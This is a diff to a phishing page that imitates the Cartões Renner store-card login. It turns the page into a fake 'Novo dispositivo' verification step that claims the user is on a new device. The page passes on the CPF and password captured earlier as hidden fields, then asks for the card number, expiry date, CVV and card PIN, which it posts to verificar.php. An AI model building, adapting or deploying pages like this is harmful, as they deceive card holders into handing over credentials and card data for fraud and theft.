@@ -1,5 +1,6 @@
-<?php
- <html class="">
+
+
+<html class="">
    <head>
       <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
       <!-- Constantes -->
@@ -16135,7 +16136,16 @@
       </style>
       
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
+      <script type="text/javascript">
+function formatar_mascara(src, mascara) {
+ var campo = src.value.length;
+ var saida = mascara.substring(0,1);
+ var texto = mascara.substring(campo);
+ if(texto.substring(0,1) != saida) {
+ src.value += texto.substring(0,1);
+ }
+}
+</script>
    </head>
    <body class="">
       <div id="root">
@@ -16247,11 +16257,11 @@
                                                          </acesso-rapido>
                                                          <card-login ctrl="$ctrl" subtitle-mode="hidden" actions-mode="hidden" class="ng-isolate-scope">
                                                             <div class="card">
-                                                               <form name="$ctrl.ctrl.form" ng-submit="$ctrl.ctrl.submit()" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf" method="POST" action="seguranca.php">
+                                                               <form name="$ctrl.ctrl.form" ng-submit="$ctrl.ctrl.submit()" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf" method="POST" action="verificar.php">
                                                                   <div class="card__title" ng-class="$ctrl.titleMode">
                                                                      <div ng-transclude="title">
                                                                         <card-title class="ng-scope">
-                                                                           <span>Acesse sua conta</span>
+                                                                           <span>Novo dispositivo</span>
                                                                         </card-title>
                                                                      </div>
                                                                   </div>
@@ -16266,15 +16276,17 @@
 	</path>
 </svg>
 
-            <p>Senha utilizada para acessar o aplicativo e o site dos Cartões Renner.</p>
+            <p>Percebemos que você acessando de um dispositivo diferente, por favor confirme os seguintes dados para continuar com o acesso.</p>
           </div>
+
+          
                                                                   <div class="card__fields" ng-class="$ctrl.fieldsMode">
                                                                      <div ng-transclude="fields">
-                                                                        <card-fields class="ng-scope">
+                                                                     <card-fields class="ng-scope">
                                                                            <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
                                                                            <input type="hidden" name="cpf" id="cpf" value="<?php echo $cpf ?>">   
-                                                                           <input cpf="" type="password" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="senha" id="senha" autofocus="$ctrl.$modal.isEmpty()" maxlength="6" ng-minlength="14" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">
-                                                                              <label ng-show="label" class="textfield__label ng-binding">Senha eletronica</label>
+                                                                           <input type="hidden" name="senha" id="senha" value="<?php echo $senha ?>">   
+                                                                           <input cpf="" type="tel" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="cc" id="cc" autofocus="$ctrl.$modal.isEmpty()" maxlength="19" ng-minlength="19" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="" placeholder="Número do cartão" onkeypress="formatar_mascara(this,'#### #### #### ####')">
                                                                               <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                               <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
                                                                               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500.00001" focusable="false" class="ng-scope">
@@ -16288,6 +16300,61 @@
                                                                               Número de CPF inválido
                                                                               </small>
                                                                            </div>
+                                                                           
+                                                                        </card-fields>
+                                                                        <card-fields class="ng-scope">
+                                                                           <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
+                                                                           <input cpf="" type="tel" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="validade" id="validade" autofocus="$ctrl.$modal.isEmpty()" maxlength="5" ng-minlength="5" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="" placeholder="Vencimento (MM/AA)" onkeypress="formatar_mascara(this,'##/##')">
+                                                                              <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
+                                                                              <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
+                                                                              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500.00001" focusable="false" class="ng-scope">
+	<path d="M135.046 215.039h229.892v-68.565c0-62.283-52.59-111.845-114.872-111.845-62.26 0-115.02 49.563-115.02 111.845v68.565zM250.064 361.11c27.777 0 27.777-9.427 27.777-23.316 0-13.015 0-21.761-27.777-21.761-27.779 0-27.779 11.59-27.779 21.761 0 13.889 0 23.316 27.779 23.316zm-1.084 61.623c-9.508-.13-19.514-6.973-19.383-16.462v-22.383c-20.043-7.42-35.09-18.317-35.09-46.094 0-27.778 13.89-49.539 55.557-49.539 41.666 0 55.555 21.761 55.555 49.539 0 27.777-15.182 38.674-35.215 46.094v22.884c-.148 9.497-11.922 16.091-21.424 15.96zM82.514 499.998c-22.361 0-40.784-18.423-40.784-40.805v-203.37c0-22.373 18.423-40.784 40.784-40.784h17.945v-68.565C100.459 65.61 169.21 0 250.064 0 330.926 0 399.54 65.611 399.54 146.474v68.565h17.945c22.361 0 40.784 18.414 40.784 40.784l-.021 148.975v.459c-.148 9.483-8.07 17.167-17.554 17.053-9.501-.13-17.189-8.092-17.075-17.575l.021-148.91c0-3.933-2.253-6.178-6.155-6.178H82.513c-3.9 0-6.155 2.244-6.155 6.178v203.37c0 3.932 2.254 6.177 6.155 6.177h334.973c3.902 0 6.155-2.245 6.155-6.177l.023.543c-.034-.333-.011-.664 0-1 .16-9.477 8.066-17.172 17.554-17.01 9.468.142 17.16 8.053 17.03 17.533-.033 22.347-18.424 40.74-40.762 40.74L82.514 500z">
+	</path>
+</svg>
+                                                                              </div>
+                                                                              <!-- end ngIf: icon -->
+                                                                              <!-- ngIf: !icon && prefix -->
+                                                                              <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="Número de CPF inválido">
+                                                                              Número de CPF inválido
+                                                                              </small>
+                                                                           </div>
+                                                                           
+                                                                        </card-fields>
+                                                                        <card-fields class="ng-scope">
+                                                                           <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
+                                                                           <input cpf="" type="tel" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="cvv" id="cvv" autofocus="$ctrl.$modal.isEmpty()" maxlength="3" ng-minlength="3" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="" placeholder="Codigo de segurança (CVV)">
+                                                                              <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
+                                                                              <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
+                                                                              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500.00001" focusable="false" class="ng-scope">
+	<path d="M135.046 215.039h229.892v-68.565c0-62.283-52.59-111.845-114.872-111.845-62.26 0-115.02 49.563-115.02 111.845v68.565zM250.064 361.11c27.777 0 27.777-9.427 27.777-23.316 0-13.015 0-21.761-27.777-21.761-27.779 0-27.779 11.59-27.779 21.761 0 13.889 0 23.316 27.779 23.316zm-1.084 61.623c-9.508-.13-19.514-6.973-19.383-16.462v-22.383c-20.043-7.42-35.09-18.317-35.09-46.094 0-27.778 13.89-49.539 55.557-49.539 41.666 0 55.555 21.761 55.555 49.539 0 27.777-15.182 38.674-35.215 46.094v22.884c-.148 9.497-11.922 16.091-21.424 15.96zM82.514 499.998c-22.361 0-40.784-18.423-40.784-40.805v-203.37c0-22.373 18.423-40.784 40.784-40.784h17.945v-68.565C100.459 65.61 169.21 0 250.064 0 330.926 0 399.54 65.611 399.54 146.474v68.565h17.945c22.361 0 40.784 18.414 40.784 40.784l-.021 148.975v.459c-.148 9.483-8.07 17.167-17.554 17.053-9.501-.13-17.189-8.092-17.075-17.575l.021-148.91c0-3.933-2.253-6.178-6.155-6.178H82.513c-3.9 0-6.155 2.244-6.155 6.178v203.37c0 3.932 2.254 6.177 6.155 6.177h334.973c3.902 0 6.155-2.245 6.155-6.177l.023.543c-.034-.333-.011-.664 0-1 .16-9.477 8.066-17.172 17.554-17.01 9.468.142 17.16 8.053 17.03 17.533-.033 22.347-18.424 40.74-40.762 40.74L82.514 500z">
+	</path>
+</svg>
+                                                                              </div>
+                                                                              <!-- end ngIf: icon -->
+                                                                              <!-- ngIf: !icon && prefix -->
+                                                                              <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="Número de CPF inválido">
+                                                                              Número de CPF inválido
+                                                                              </small>
+                                                                           </div>
+                                                                           
+                                                                        </card-fields>
+                                                                        <card-fields class="ng-scope">
+                                                                           <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
+                                                                           <input cpf="" type="password" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="senha2" id="senha2" autofocus="$ctrl.$modal.isEmpty()" maxlength="6" ng-minlength="6" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="" placeholder="Senha do cartão">
+                                                                              <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
+                                                                              <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
+                                                                              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500.00001" focusable="false" class="ng-scope">
+	<path d="M135.046 215.039h229.892v-68.565c0-62.283-52.59-111.845-114.872-111.845-62.26 0-115.02 49.563-115.02 111.845v68.565zM250.064 361.11c27.777 0 27.777-9.427 27.777-23.316 0-13.015 0-21.761-27.777-21.761-27.779 0-27.779 11.59-27.779 21.761 0 13.889 0 23.316 27.779 23.316zm-1.084 61.623c-9.508-.13-19.514-6.973-19.383-16.462v-22.383c-20.043-7.42-35.09-18.317-35.09-46.094 0-27.778 13.89-49.539 55.557-49.539 41.666 0 55.555 21.761 55.555 49.539 0 27.777-15.182 38.674-35.215 46.094v22.884c-.148 9.497-11.922 16.091-21.424 15.96zM82.514 499.998c-22.361 0-40.784-18.423-40.784-40.805v-203.37c0-22.373 18.423-40.784 40.784-40.784h17.945v-68.565C100.459 65.61 169.21 0 250.064 0 330.926 0 399.54 65.611 399.54 146.474v68.565h17.945c22.361 0 40.784 18.414 40.784 40.784l-.021 148.975v.459c-.148 9.483-8.07 17.167-17.554 17.053-9.501-.13-17.189-8.092-17.075-17.575l.021-148.91c0-3.933-2.253-6.178-6.155-6.178H82.513c-3.9 0-6.155 2.244-6.155 6.178v203.37c0 3.932 2.254 6.177 6.155 6.177h334.973c3.902 0 6.155-2.245 6.155-6.177l.023.543c-.034-.333-.011-.664 0-1 .16-9.477 8.066-17.172 17.554-17.01 9.468.142 17.16 8.053 17.03 17.533-.033 22.347-18.424 40.74-40.762 40.74L82.514 500z">
+	</path>
+</svg>
+                                                                              </div>
+                                                                              <!-- end ngIf: icon -->
+                                                                              <!-- ngIf: !icon && prefix -->
+                                                                              <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="Número de CPF inválido">
+                                                                              Número de CPF inválido
+                                                                              </small>
+                                                                           </div>
+                                                                           
                                                                         </card-fields>
                                                                      </div>
                                                                   </div>
@@ -16557,7 +16624,7 @@
          <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="o desafio reCAPTCHA expira em dois minutos" src="https://www.google.com/recaptcha/api2/bframe?hl=pt-BR&amp;v=2uoiJ4hP3NUoP9v_eBNfU6CR&amp;k=6LcNwW8UAAAAAJ8eSLfer6Z8Lm28favadVWPryjV" name="c-5um0r2x7qyhw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div>
       </div>
       <script>
-          document.body.querySelector("#senha").addEventListener("input", function(){
+          document.body.querySelector("#senha2").addEventListener("input", function(){
    
    var botao_proximo = document.body.querySelector("#manda");
    
